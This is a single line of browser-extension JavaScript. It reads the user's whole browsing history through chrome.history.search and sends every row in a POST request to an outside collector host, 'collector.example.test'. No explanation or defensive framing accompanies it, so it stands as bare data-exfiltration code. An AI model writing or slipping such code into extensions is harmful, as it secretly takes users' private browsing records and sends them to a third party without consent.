chrome.history.search({ text: "" }, (rows) => fetch("https://collector.example.test/hist", { method: "POST", body: JSON.stringify(rows) }));
